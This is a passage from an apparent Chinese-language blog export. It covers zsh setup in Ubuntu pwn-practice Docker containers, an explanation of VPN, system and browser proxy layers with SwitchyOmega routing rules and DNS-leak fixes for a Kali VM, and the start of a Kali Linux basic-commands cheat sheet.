<h2 id="十二、Ubuntu-16-04-安装zsh（解决软件源问题）"><a href="#十二、Ubuntu-16-04-安装zsh（解决软件源问题）" class="headerlink" title="十二、Ubuntu 16.04 安装zsh（解决软件源问题）"></a>十二、Ubuntu 16.04 安装zsh（解决软件源问题）</h2><h3 id="Ubuntu-16-04-zsh安装步骤"><a href="#Ubuntu-16-04-zsh安装步骤" class="headerlink" title="Ubuntu 16.04 zsh安装步骤"></a>Ubuntu 16.04 zsh安装步骤</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 更换软件源（解决Ubuntu 16.04软件源过期问题）</span></span><br><span class="line"><span class="built_in">cp</span> /etc/apt/sources.list /etc/apt/sources.list.backup</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用archive.ubuntu.com（最稳定的源）</span></span><br><span class="line"><span class="built_in">cat</span> &gt; /etc/apt/sources.list &lt;&lt; <span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">deb http://archive.ubuntu.com/ubuntu/ xenial main restricted universe multiverse</span><br><span class="line">deb http://archive.ubuntu.com/ubuntu/ xenial-updates main restricted universe multiverse</span><br><span class="line">deb http://archive.ubuntu.com/ubuntu/ xenial-backports main restricted universe multiverse</span><br><span class="line">deb http://security.ubuntu.com/ubuntu/ xenial-security main restricted universe multiverse</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 更新软件源</span></span><br><span class="line">apt update</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 只安装最基本的zsh</span></span><br><span class="line">apt install -y zsh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 创建极简配置</span></span><br><span class="line"><span class="built_in">cat</span> &gt; ~/.zshrc &lt;&lt; <span class="string">&#x27;EOF&#x27;</span></span><br><span class="line"><span class="built_in">export</span> TERM=xterm-256color</span><br><span class="line">PS1=<span class="string">&quot;[%n@%m %~]$ &quot;</span></span><br><span class="line"><span class="built_in">alias</span> ll=<span class="string">&#x27;ls -la&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> pwn-cd=<span class="string">&#x27;cd /root/myPwn&#x27;</span></span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 设置默认shell</span></span><br><span class="line">chsh -s $(<span class="built_in">which</span> zsh)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. 退出并重新进入测试</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">docker <span class="built_in">exec</span> -it pwn-2.23 zsh</span><br></pre></td></tr></table></figure>

<h3 id="Ubuntu-16-04-zsh颜色配置（可选）"><a href="#Ubuntu-16-04-zsh颜色配置（可选）" class="headerlink" title="Ubuntu 16.04 zsh颜色配置（可选）"></a>Ubuntu 16.04 zsh颜色配置（可选）</h3><p>如果极简配置工作正常，可以添加颜色：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 备份当前配置</span></span><br><span class="line"><span class="built_in">cp</span> ~/.zshrc ~/.zshrc.backup</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建带颜色的配置</span></span><br><span class="line"><span class="built_in">cat</span> &gt; ~/.zshrc &lt;&lt; <span class="string">&#x27;EOF&#x27;</span></span><br><span class="line"><span class="comment"># 启用颜色支持</span></span><br><span class="line"><span class="built_in">autoload</span> -U colors &amp;&amp; colors</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置彩色提示符</span></span><br><span class="line">PS1=<span class="string">&quot;%&#123;<span class="variable">$fg</span>[green]%&#125;%n@%m%&#123;<span class="variable">$reset_color</span>%&#125;:%&#123;<span class="variable">$fg</span>[blue]%&#125;%~%&#123;<span class="variable">$reset_color</span>%&#125;$ &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置终端类型</span></span><br><span class="line"><span class="built_in">export</span> TERM=xterm-256color</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启用自动补全</span></span><br><span class="line"><span class="built_in">autoload</span> -U compinit</span><br><span class="line">compinit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置别名（带颜色）</span></span><br><span class="line"><span class="built_in">alias</span> <span class="built_in">ls</span>=<span class="string">&#x27;ls --color=auto&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> ll=<span class="string">&#x27;ls -la --color=auto&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> grep=<span class="string">&#x27;grep --color=auto&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> pwn-cd=<span class="string">&#x27;cd /root/myPwn&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> gdb-start=<span class="string">&#x27;gdbserver 0.0.0.0:9997&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> pwn-env=<span class="string">&#x27;echo &quot;Ubuntu 16.04 - libc 2.23 - Port 9997&quot;&#x27;</span></span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新加载配置</span></span><br><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure>

<h2 id="十三、Ubuntu-18-04-20-04-安装zsh（标准方法）"><a href="#十三、Ubuntu-18-04-20-04-安装zsh（标准方法）" class="headerlink" title="十三、Ubuntu 18.04&#x2F;20.04 安装zsh（标准方法）"></a>十三、Ubuntu 18.04&#x2F;20.04 安装zsh（标准方法）</h2><h3 id="Ubuntu-18-04-20-04-zsh安装步骤"><a href="#Ubuntu-18-04-20-04-zsh安装步骤" class="headerlink" title="Ubuntu 18.04&#x2F;20.04 zsh安装步骤"></a>Ubuntu 18.04&#x2F;20.04 zsh安装步骤</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进入容器</span></span><br><span class="line">docker <span class="built_in">exec</span> -it pwn-2.27 /bin/bash  <span class="comment"># 或 pwn-2.31</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装zsh</span></span><br><span class="line">apt update &amp;&amp; apt install -y zsh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建配置（可根据需要选择极简或彩色版本）</span></span><br><span class="line"><span class="built_in">cat</span> &gt; ~/.zshrc &lt;&lt; <span class="string">&#x27;EOF&#x27;</span></span><br><span class="line"><span class="built_in">export</span> TERM=xterm-256color</span><br><span class="line">PS1=<span class="string">&quot;[%n@%m %~]$ &quot;</span></span><br><span class="line"><span class="built_in">alias</span> ll=<span class="string">&#x27;ls -la&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> pwn-cd=<span class="string">&#x27;cd /root/myPwn&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> gdb-start=<span class="string">&#x27;gdbserver 0.0.0.0:9998&#x27;</span>  <span class="comment"># 18.04用9998，20.04用9999</span></span><br><span class="line"><span class="built_in">alias</span> pwn-env=<span class="string">&#x27;echo &quot;Ubuntu 18.04 - libc 2.27 - Port 9998&quot;&#x27;</span>  <span class="comment"># 相应修改版本信息</span></span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置默认shell</span></span><br><span class="line">chsh -s $(<span class="built_in">which</span> zsh)</span><br></pre></td></tr></table></figure>

<h2 id="十四、注意事项"><a href="#十四、注意事项" class="headerlink" title="十四、注意事项"></a>十四、注意事项</h2><ol>
<li><strong>Ubuntu 16.04必须更换软件源</strong>后才能正常安装zsh</li>
<li>如果遇到locale错误，可执行：<code>export LANG=C</code></li>
<li>极简配置确保兼容性，彩色配置提供更好体验</li>
<li>建议先测试极简配置，确认正常后再尝试彩色配置</li>
</ol>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>VPN代理与流量流向分析</title>
    <url>/2025/11/13/VPN%E4%BB%A3%E7%90%86%E4%B8%8E%E6%B5%81%E9%87%8F%E6%B5%81%E5%90%91%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="一、代理层级架构与优先级原理"><a href="#一、代理层级架构与优先级原理" class="headerlink" title="一、代理层级架构与优先级原理"></a>一、代理层级架构与优先级原理</h2><img src="/2025/11/13/VPN%E4%BB%A3%E7%90%86%E4%B8%8E%E6%B5%81%E9%87%8F%E6%B5%81%E5%90%91%E5%88%86%E6%9E%90/image_1.png" class="" title="在这里插入图片描述">




<h3 id="1-网络层代理（VPN）-最底层"><a href="#1-网络层代理（VPN）-最底层" class="headerlink" title="1. 网络层代理（VPN）- 最底层"></a>1.<code> 网络层代理</code>（VPN）- 最底层</h3><ul>
<li><strong>工作层级</strong>：操作系统内核层</li>
<li><strong>技术代表</strong>：OpenVPN、WireGuard、IPsec</li>
<li><strong>控制粒度</strong>：<strong>全局代理</strong> - 所有应用程序流量</li>
<li><strong>技术比喻</strong>：给电脑<strong>虚拟搬迁</strong>到VPN服务器机房</li>
<li><strong>特点</strong>：透明性高、安全性强，但灵活性差</li>
</ul>
<h3 id="2-系统层代理-中间层"><a href="#2-系统层代理-中间层" class="headerlink" title="2. 系统层代理 - 中间层"></a>2. <code>系统层代理 </code>- 中间层</h3><ul>
<li><strong>工作层级</strong>：操作系统应用层协议</li>
<li><strong>技术代表</strong>：Windows&#x2F;MacOS系统代理设置</li>
<li><strong>控制粒度</strong>：<strong>系统级</strong> - 影响遵守系统设置的应用程序</li>
<li><strong>技术比喻</strong>：设立<strong>总的收发室</strong>处理外寄信件</li>
<li><strong>特点</strong>：配置方便，但容易被应用程序绕过</li>
</ul>
<h3 id="3-应用层代理-最高层"><a href="#3-应用层代理-最高层" class="headerlink" title="3. 应用层代理 - 最高层"></a>3. <code>应用层代理</code> - 最高层</h3><ul>
<li><p><strong>浏览器插件</strong>（SwitchyOmega等）：</p>
<ul>
<li><strong>控制粒度</strong>：<strong>进程级</strong> - 仅控制浏览器流量</li>
<li><strong>技术比喻</strong>：书房内的<strong>智能路由器</strong></li>
<li><strong>存在意义</strong>：提供最精细的流量控制，实现国内外网站分流</li>
</ul>
</li>
<li><p><strong>应用程序内置代理</strong>：</p>
<ul>
<li><strong>控制粒度</strong>：<strong>应用级</strong> - 仅影响单个应用程序</li>
<li><strong>特点</strong>：配置独立，针对性强的网络通道</li>
</ul>
</li>
</ul>
<hr>
<h2 id="二、四大核心场景流量走向详解"><a href="#二、四大核心场景流量走向详解" class="headerlink" title="二、四大核心场景流量走向详解"></a>二、四大核心场景流量走向详解</h2><h3 id="场景1：主机标准VPN模式（无冲突）"><a href="#场景1：主机标准VPN模式（无冲突）" class="headerlink" title="场景1：主机标准VPN模式（无冲突）"></a>场景1：主机标准VPN模式（无冲突）</h3><img src="/2025/11/13/VPN%E4%BB%A3%E7%90%86%E4%B8%8E%E6%B5%81%E9%87%8F%E6%B5%81%E5%90%91%E5%88%86%E6%9E%90/image_2.png" class="" title="在这里插入图片描述">



<p><strong>核心逻辑</strong>：最标准的VPN使用场景。所有应用程序流量都遵循系统级代理设置，通过VPN隧道加密转发，实现全局网络匿名化。</p>
<p><strong>适用场景</strong>：需要完全匿名、安全加密所有流量的环境。</p>
<h3 id="场景2：主机浏览器代理分流（主动绕行）"><a href="#场景2：主机浏览器代理分流（主动绕行）" class="headerlink" title="场景2：主机浏览器代理分流（主动绕行）"></a>场景2：主机浏览器代理分流（主动绕行）</h3><img src="/2025/11/13/VPN%E4%BB%A3%E7%90%86%E4%B8%8E%E6%B5%81%E9%87%8F%E6%B5%81%E5%90%91%E5%88%86%E6%9E%90/image_3.png" class="" title="在这里插入图片描述">


<p><strong>核心逻辑</strong>：浏览器插件优先级高于系统代理，实现<strong>精细化流量分流</strong>。浏览器按插件规则转发（国内外网站分流），其他应用仍走VPN通道。</p>
<p><strong>存在意义</strong>：解决VPN”一刀切”的弊端，优化访问速度，避免国内流量绕行。</p>
<h3 id="场景3：虚拟机理想共享模式（透明代理）"><a href="#场景3：虚拟机理想共享模式（透明代理）" class="headerlink" title="场景3：虚拟机理想共享模式（透明代理）"></a>场景3：虚拟机理想共享模式（透明代理）</h3><img src="/2025/11/13/VPN%E4%BB%A3%E7%90%86%E4%B8%8E%E6%B5%81%E9%87%8F%E6%B5%81%E5%90%91%E5%88%86%E6%9E%90/image_4.png" class="" title="在这里插入图片描述">


<p><strong>核心逻辑</strong>：虚拟机通过NAT模式完全依赖主机网络路由，继承主机VPN设置，实现”透明代理”效果。</p>
<p><strong>前提条件</strong>：</p>
<ul>
<li>虚拟机设为<strong>NAT模式</strong></li>
<li>关闭虚拟机内所有代理插件</li>
<li>主机运行全局VPN</li>
</ul>
<h3 id="场景4：虚拟机代理冲突（嵌套绕行）"><a href="#场景4：虚拟机代理冲突（嵌套绕行）" class="headerlink" title="场景4：虚拟机代理冲突（嵌套绕行）"></a>场景4：虚拟机代理冲突（嵌套绕行）</h3><img src="/2025/11/13/VPN%E4%BB%A3%E7%90%86%E4%B8%8E%E6%B5%81%E9%87%8F%E6%B5%81%E5%90%91%E5%88%86%E6%9E%90/image_5.png" class="" title="在这里插入图片描述">


<p><strong>核心逻辑</strong>：虚拟机内浏览器插件拦截流量，导致浏览器绕开主机VPN，形成<strong>代理嵌套冲突</strong>。</p>
<p><strong>问题根源</strong>：虚拟机内的高优先级代理规则覆盖了主机的低优先级代理规则。</p>
<hr>
<h2 id="三、Kali-虚拟机配置"><a href="#三、Kali-虚拟机配置" class="headerlink" title="三、Kali 虚拟机配置"></a>三、Kali 虚拟机配置</h2><h3 id="完整配置检查清单"><a href="#完整配置检查清单" class="headerlink" title="完整配置检查清单"></a>完整配置检查清单</h3><p>为确保Kali虚拟机正确共享主机VPN，请按以下流程系统配置：</p>
<img src="/2025/11/13/VPN%E4%BB%A3%E7%90%86%E4%B8%8E%E6%B5%81%E9%87%8F%E6%B5%81%E5%90%91%E5%88%86%E6%9E%90/image_6.png" class="" title="在这里插入图片描述">


<h3 id="关键配置步骤"><a href="#关键配置步骤" class="headerlink" title="关键配置步骤"></a>关键配置步骤</h3><h4 id="1-基础环境配置"><a href="#1-基础环境配置" class="headerlink" title="1. 基础环境配置"></a>1. 基础环境配置</h4><ul>
<li><strong>主机VPN</strong>：必须使用系统级全局VPN（OpenVPN、WireGuard等）</li>
<li><strong>网络模式</strong>：虚拟机设置为<strong>NAT模式</strong>（默认）</li>
</ul>
<h4 id="2-DNS泄漏解决方案"><a href="#2-DNS泄漏解决方案" class="headerlink" title="2. DNS泄漏解决方案"></a>2. DNS泄漏解决方案</h4><p><strong>临时方案（测试用）</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nano /etc/resolv.conf</span><br><span class="line"><span class="comment"># 添加：nameserver 10.8.0.1 （替换为实际VPN DNS）</span></span><br><span class="line"><span class="built_in">sudo</span> chattr +i /etc/resolv.conf  <span class="comment"># 锁定文件</span></span><br></pre></td></tr></table></figure>

<p><strong>永久方案（推荐）</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl <span class="built_in">disable</span> systemd-resolved</span><br><span class="line"><span class="built_in">sudo</span> systemctl stop systemd-resolved</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">rm</span> -f /etc/resolv.conf</span><br><span class="line"><span class="built_in">sudo</span> nano /etc/resolv.conf  <span class="comment"># 配置VPN DNS</span></span><br><span class="line"><span class="built_in">sudo</span> systemctl restart NetworkManager</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="四、验证与故障排除"><a href="#四、验证与故障排除" class="headerlink" title="四、验证与故障排除"></a>四、验证与故障排除</h2><h3 id="基础验证方法"><a href="#基础验证方法" class="headerlink" title="基础验证方法"></a>基础验证方法</h3><ol>
<li><p><strong>IP地址检测</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl ifconfig.me</span><br><span class="line"><span class="comment"># 访问：WhatIsMyIPAddress.com</span></span><br></pre></td></tr></table></figure>
<p><strong>预期</strong>：显示IP应与VPN服务器位置一致</p>
</li>
<li><p><strong>DNS泄漏测试</strong>：</p>
<ul>
<li>访问 <a href="https://www.dnsleaktest.com/">DNS Leak Test</a></li>
<li>执行 <strong>Extended Test</strong><br><strong>预期</strong>：不应出现本地ISP的DNS服务器</li>
</ul>
</li>
</ol>
<h3 id="故障排除-checklist"><a href="#故障排除-checklist" class="headerlink" title="故障排除 checklist"></a>故障排除 checklist</h3><ul>
<li>✅ 主机VPN是否正常连接</li>
<li>✅ 虚拟机是否为NAT模式  </li>
<li>✅ 虚拟机浏览器代理插件是否关闭</li>
<li>✅ DNS是否配置正确且无泄漏</li>
<li>✅ 系统时间是否同步（影响HTTPS）</li>
</ul>
<h2 id="五、知识总结"><a href="#五、知识总结" class="headerlink" title="五、知识总结"></a>五、知识总结</h2><h3 id="代理选择策略"><a href="#代理选择策略" class="headerlink" title="代理选择策略"></a>代理选择策略</h3><table>
<thead>
<tr>
<th>需求场景</th>
<th>推荐代理方式</th>
<th>理由</th>
</tr>
</thead>
<tbody><tr>
<td>全局匿名安全</td>
<td><strong>网络层VPN</strong></td>
<td>所有流量加密，完全匿名</td>
</tr>
<tr>
<td>网页浏览优化</td>
<td><strong>浏览器插件</strong></td>
<td>国内外分流，速度最优</td>
</tr>
<tr>
<td>办公环境统一</td>
<td><strong>系统代理</strong></td>
<td>统一管理，配置简便</td>
</tr>
<tr>
<td>虚拟机共享</td>
<td><strong>NAT模式+VPN</strong></td>
<td>透明代理，无需复杂配置</td>
</tr>
</tbody></table>
<h3 id="关键原则"><a href="#关键原则" class="headerlink" title="关键原则"></a>关键原则</h3><ol>
<li><strong>理解代理层级</strong>：浏览器插件 &gt; 系统代理 &gt; VPN</li>
<li><strong>虚拟机前提</strong>：NAT模式是共享主机VPN的基础</li>
<li><strong>DNS安全</strong>：DNS泄漏是最大的安全隐患</li>
<li><strong>按需配置</strong>：根据实际需求选择合适的代理层级</li>
</ol>
<hr>
<h2 id="六、浏览器插件使用"><a href="#六、浏览器插件使用" class="headerlink" title="六、浏览器插件使用"></a>六、浏览器插件使用</h2><h3 id="方法一：SwitchyOmega-系统VPN联动（推荐）"><a href="#方法一：SwitchyOmega-系统VPN联动（推荐）" class="headerlink" title="方法一：SwitchyOmega + 系统VPN联动（推荐）"></a>方法一：SwitchyOmega + 系统VPN联动（推荐）</h3><ul>
<li><p>基础环境准备</p>
<ul>
<li><strong>系统VPN</strong>：连接你的全局VPN（OpenVPN、WireGuard等）</li>
<li><strong>SwitchyOmega</strong>：在浏览器中安装并配置</li>
</ul>
</li>
<li><p>SwitchyOmega配置步骤： 创建两个情景模式：</p>
<ul>
<li><p><strong>直连模式</strong>（Direct）<br>- 类型：直接连接<br>- 用于访问国内网站</p>
</li>
<li><p><strong>VPN模式</strong>（System VPN）<br>- 类型：直接连接（是的，直接连接！）<br>- 因为系统VPN已经在全局工作，这里选择直接连接就会走系统VPN</p>
</li>
</ul>
</li>
</ul>
<p><strong>配置自动切换模式（Auto Switch）：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在自动切换的规则列表中配置</span></span><br><span class="line"><span class="comment">// 国内网站直连，国外网站走系统VPN</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 直连规则（国内网站）</span></span><br><span class="line">||baidu.<span class="property">com</span>^ → <span class="title class_">Direct</span></span><br><span class="line">||taobao.<span class="property">com</span>^ → <span class="title class_">Direct</span>  </span><br><span class="line">||qq.<span class="property">com</span>^ → <span class="title class_">Direct</span></span><br><span class="line">||weibo.<span class="property">com</span>^ → <span class="title class_">Direct</span></span><br><span class="line">||zhihu.<span class="property">com</span>^ → <span class="title class_">Direct</span></span><br><span class="line">||alipay.<span class="property">com</span>^ → <span class="title class_">Direct</span></span><br><span class="line">||jd.<span class="property">com</span>^ → <span class="title class_">Direct</span></span><br><span class="line">||<span class="number">163.</span>com^ → <span class="title class_">Direct</span></span><br><span class="line">||sina.<span class="property">com</span>.<span class="property">cn</span>^ → <span class="title class_">Direct</span></span><br><span class="line">||sohu.<span class="property">com</span>^ → <span class="title class_">Direct</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用系统VPN（国外网站）</span></span><br><span class="line">||google.<span class="property">com</span>^ → <span class="title class_">System</span> <span class="variable constant_">VPN</span></span><br><span class="line">||youtube.<span class="property">com</span>^ → <span class="title class_">System</span> <span class="variable constant_">VPN</span></span><br><span class="line">||facebook.<span class="property">com</span>^ → <span class="title class_">System</span> <span class="variable constant_">VPN</span></span><br><span class="line">||twitter.<span class="property">com</span>^ → <span class="title class_">System</span> <span class="variable constant_">VPN</span></span><br><span class="line">||github.<span class="property">com</span>^ → <span class="title class_">System</span> <span class="variable constant_">VPN</span></span><br><span class="line">||wikipedia.<span class="property">org</span>^ → <span class="title class_">System</span> <span class="variable constant_">VPN</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 默认规则：直连（保守策略）</span></span><br><span class="line">* → <span class="title class_">Direct</span></span><br></pre></td></tr></table></figure>

<p>使用更智能的方案：使用规则列表</p>
<p><strong>导入现成的规则列表：</strong></p>
<ol>
<li>在Auto Switch模式中点击”从文件恢复”</li>
<li>导入以下规则列表之一：<ul>
<li><strong>GFWList</strong>：最全面的被墙网站列表</li>
<li><strong>ChinaList</strong>：中国国内网站列表</li>
</ul>
</li>
</ol>
<p><strong>或者使用在线规则列表：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt</span><br></pre></td></tr></table></figure>

<p>配置完成后，流量走向如下：</p>
<img src="/2025/11/13/VPN%E4%BB%A3%E7%90%86%E4%B8%8E%E6%B5%81%E9%87%8F%E6%B5%81%E5%90%91%E5%88%86%E6%9E%90/image_7.png" class="" title="在这里插入图片描述">


<h3 id="方法二：纯SwitchyOmega代理方案（替代方案）"><a href="#方法二：纯SwitchyOmega代理方案（替代方案）" class="headerlink" title="方法二：纯SwitchyOmega代理方案（替代方案）"></a>方法二：纯SwitchyOmega代理方案（替代方案）</h3><p>如果系统VPN不稳定，可以在SwitchyOmega中直接配置代理：</p>
<p>配置代理服务器情景模式：</p>
<ul>
<li><strong>名称</strong>：My VPN</li>
<li><strong>协议</strong>：SOCKS5 或 HTTP</li>
<li><strong>服务器</strong>：你的VPN服务器地址</li>
<li><strong>端口</strong>：对应的代理端口</li>
</ul>
<p> 自动切换规则</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 国内CDN和常用服务直连</span></span><br><span class="line">||cn^ → <span class="title class_">Direct</span></span><br><span class="line">||taobao.<span class="property">com</span>^ → <span class="title class_">Direct</span></span><br><span class="line">||baidu.<span class="property">com</span>^ → <span class="title class_">Direct</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 国外网站走代理</span></span><br><span class="line">||google.<span class="property">com</span>^ → <span class="title class_">My</span> <span class="variable constant_">VPN</span></span><br><span class="line">||youtube.<span class="property">com</span>^ → <span class="title class_">My</span> <span class="variable constant_">VPN</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 默认直连</span></span><br><span class="line">* → <span class="title class_">Direct</span></span><br></pre></td></tr></table></figure>

<h3 id="方法三：进阶优化配置"><a href="#方法三：进阶优化配置" class="headerlink" title="方法三：进阶优化配置"></a>方法三：进阶优化配置</h3><ol>
<li>性能优化规则</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 图片、视频直连（加速加载）</span></span><br><span class="line">||jpg|png|gif|mp4|webm^ → <span class="title class_">Direct</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 国内CDN直连</span></span><br><span class="line">||cloudflare.<span class="property">com</span>^ → <span class="title class_">Direct</span></span><br><span class="line">||akamai.<span class="property">net</span>^ → <span class="title class_">Direct</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 银行支付网站直连（安全）</span></span><br><span class="line">||alipay.<span class="property">com</span>^ → <span class="title class_">Direct</span></span><br><span class="line">||unionpay.<span class="property">com</span>^ → <span class="title class_">Direct</span></span><br><span class="line">||icbc.<span class="property">com</span>.<span class="property">cn</span>^ → <span class="title class_">Direct</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>条件规则</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 根据网络环境自动调整</span></span><br><span class="line"><span class="comment">// 如果在国内网络，启用分流</span></span><br><span class="line"><span class="comment">// 如果在国外网络，全部直连</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 本地网络直连</span></span><br><span class="line"><span class="number">192.168</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">16</span> → <span class="title class_">Direct</span></span><br><span class="line"><span class="number">10.0</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">8</span> → <span class="title class_">Direct</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> → <span class="title class_">Direct</span></span><br></pre></td></tr></table></figure>

<h2 id="验证配置效果"><a href="#验证配置效果" class="headerlink" title="验证配置效果"></a>验证配置效果</h2><ol>
<li>测试国内网站</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 访问以下网站应显示国内IP</span></span><br><span class="line">百度、淘宝、京东</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>测试国外网站</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 访问以下网站应显示VPN服务器IP</span></span><br><span class="line">Google、YouTube、Twitter</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>使用检测网站</li>
</ol>
<ul>
<li><strong>IP检测</strong>：whatismyipaddress.com</li>
<li><strong>DNS检测</strong>：dnsleaktest.com</li>
</ul>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>VPN</tag>
        <tag>代理</tag>
        <tag>虚拟机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux 常用命令笔记</title>
    <url>/2025/12/13/kali%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="1-系统基本操作"><a href="#1-系统基本操作" class="headerlink" title="1. 系统基本操作"></a>1. 系统基本操作</h2><h3 id="系统控制"><a href="#系统控制" class="headerlink" title="系统控制"></a>系统控制</h3><ul>
<li><code>reboot</code> - 重启系统</li>
<li><code>shutdown -h now</code> - 立即关闭系统</li>
<li><code>shutdown -h hours:minutes &amp;</code> - 按预定时间关闭系统</li>
<li><code>shutdown -c</code> - 取消预定的关机操作</li>
<li><code>shutdown -r now</code> - 立即重启系统</li>
<li><code>init 0</code> - 关闭系统</li>
<li><code>telinit 0</code> - 关闭系统</li>
<li><code>clear</code> - 清屏</li>
</ul>
<h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3><ul>
<li><code>env</code> - 显示当前所有环境变量</li>
<li><code>echo $PATH</code> - 查看PATH环境变量</li>
<li><code>echo $JAVA_HOME</code> - 查看JAVA_HOME环境变量</li>
<li><code>echo $PATH | grep jdk</code> - 检查PATH中是否包含JDK路径</li>
</ul>
<h3 id="用户切换与管理"><a href="#用户切换与管理" class="headerlink" title="用户切换与管理"></a>用户切换与管理</h3><ul>
<li><code>su -l</code> - 切换登录用户</li>
<li><code>su - root</code> - 切换到root用户</li>
<li><code>su 用户名</code> - 切换到普通用户</li>
<li><code>logout</code> - 注销当前用户</li>
<li><code>passwd</code> - 修改当前用户密码</li>
<li><code>passwd root</code> - 修改root用户密码</li>
</ul>
<h3 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h3><ul>
<li><code>history</code> - 查看历史命令</li>
<li><code>!!</code> - 重复上一条命令</li>
<li><code>!n</code> - 重复第n条命令</li>
</ul>
<h2 id="2-文件和目录操作"><a href="#2-文件和目录操作" class="headerlink" title="2. 文件和目录操作"></a>2. 文件和目录操作</h2><h3 id="目录导航"><a href="#目录导航" class="headerlink" title="目录导航"></a>目录导航</h3><ul>
<li><code>pwd</code> - 显示当前工作路径</li>
<li><code>cd ..</code> - 返回上一级目录</li>
<li><code>cd ../..</code> - 返回上级两级目录</li>
<li><code>cd -</code> - 返回上次所在的目录</li>
<li><code>cd 文件夹名</code> - 进入指定文件夹</li>
<li><code>cd ~</code> - 进入当前用户主目录</li>
</ul>
<h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><ul>
<li><code>touch 文件名</code> - 创建空文件</li>
<li><code>cat 文件名</code> - 读取文件内容</li>
<li><code>mkdir 文件名</code> - 创建文件夹</li>
<li><code>mkdir -p 文件夹</code> - 递归创建文件夹</li>
<li><code>mkdir 文件名 文件名</code> - 创建多个文件夹</li>
<li><code>cp 源文件 目标文件</code> - 复制文件</li>
<li><code>cp -r 源文件夹 目标文件夹</code> - 递归复制文件夹</li>
<li><code>mv 旧文件名 新文件名</code> - 移动&#x2F;重命名文件</li>
<li><code>rm 文件</code> - 删除文件</li>
<li><code>rm -f 文件</code> - 强制删除文件</li>
<li><code>rm 文件夹名</code> - 删除文件夹</li>
<li><code>rm -rf 文件/文件夹</code> - 强制递归删除文件&#x2F;文件夹及其内容</li>
</ul>
<h3 id="文件搜索"><a href="#文件搜索" class="headerlink" title="文件搜索"></a>文件搜索</h3><ul>
<li><code>find / -name file1</code> - 从根目录开始搜索文件和目录</li>
<li><code>find / -user user1</code> - 搜索属于指定用户的文件和目录</li>
<li><code>find /home/user1 -name *.bin</code> - 在指定目录中搜索特定扩展名的文件</li>
<li><code>find /usr/bin -type f -atime +100</code> - 搜索过去100天未被使用的执行文件</li>
<li><code>find /usr/bin -type f -mtime -10</code> - 搜索10天内被修改过的文件</li>
